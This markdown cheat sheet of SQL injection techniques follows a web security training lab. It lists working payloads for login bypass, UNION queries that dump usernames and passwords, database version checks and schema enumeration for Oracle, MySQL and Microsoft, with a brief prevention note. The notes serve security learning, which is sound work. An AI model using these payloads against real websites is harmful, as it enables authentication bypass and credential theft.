# **SQL Injection** 
### Retrieving hidden data, where can modify an SQL query to return additional results 
[https://insecure-website.com/products?category=Gifts]

`SELECT * FROM products WHERE category = 'Gifts' AND released = 1` 

[https://insecure-website.com/products?category=Gifts%27--]

`SELECT * FROM products WHERE category = 'Gifts'--' AND released = 1` 

[https://insecure-website.com/products?category=Gifts%27+OR+1=1--]

`SELECT * FROM products WHERE category = 'Gifts' OR 1=1--' AND released = 1` 
### Subverting application logic, where you can change a query to interfere with the application's logic
 If a users credential is wiener:bluecheese 

`SELECT * FROM users WHERE username = 'wiener' AND password = 'bluecheese'`
`SELECT * FROM users WHERE username = 'administrator'--' AND password = ''` 
### UNION attacks, where you can retrieve data from different database tables 
`SELECT name, description FROM products WHERE category = 'Gifts'` 
`' UNION SELECT username, password FROM users--` 
This will cause the application to return all usernames and passwords along with the names and descriptions of products. Examining the database, where you can extract information about the version and structure of the database 

`SELECT * FROM information_schema.tables` -- what DB table exist 

`SELECT * FROM v$version` -- Oracle version 
### Blind SQL injection, where the results of a query you control are not returned in the applications' responses 
## How to detect SQLi Vuln? 
1. Submitting ' 
2. Submitting SQL-Syntax 
3. Submitting Boolean OR 1=1 OR 1=2 
4. Submitting OAST payload
## Prevent SQLi 
Mostly by using parameterized queries (prepared statements) instead of string concatenation within query (edited)
## Some Useful Commands
###### SQL injection UNION attack, retrieving multiple values in a single column
`'+UNION+SELECT+NULL,username||'~'||password+FROM+users--` 
###### SQL injection attack, querying the database type and version on Oracle 
`'+UNION+SELECT+'abc','def'+FROM+dual--`
`'+UNION+SELECT+BANNER,+NULL+FROM+v$version--` 
###### SQL injection attack, querying the database type and version on MySQL and Microsoft 
`'+UNION+SELECT+'abc','def'#` 
`'+UNION+SELECT+@@version,+NULL#` 
###### SQL injection attack, listing the database contents on non-Oracle databases 
`'+UNION+SELECT+table_name,+NULL+FROM+information_schema.tables--` `'+UNION+SELECT+column_name,+NULL+FROM+information_schema.columns+WHERE+table_name='users_abcdef'--` `'+UNION+SELECT+username_abcdef,+password_abcdef+FROM+users_abcdef--` 
###### SQL injection attack, listing the database contents on Oracle 
`'+UNION+SELECT+table_name,NULL+FROM+all_tables--` `'+UNION+SELECT+column_name,NULL+FROM+all_tab_columns+WHERE+table_name='USERS_ABCDEF'--` `'+UNION+SELECT+USERNAME_ABCDEF,+PASSWORD_ABCDEF+FROM+USERS_ABCDEF--` . 
###### Use the following payload to retrieve the list of tables in the database: 
`'+UNION+SELECT+table_name,+NULL+FROM+information_schema.tables--` 
###### To get column available in the specified table named 'users_cwrebz' 
`'+UNION+SELECT+column_name,+NULL+FROM+information_schema.columns+WHERE+table_name='users_cwrebz'--` 
###### To list all available list of tables in a database 
`'+UNION+SELECT+table_name,NULL+FROM+all_tables--`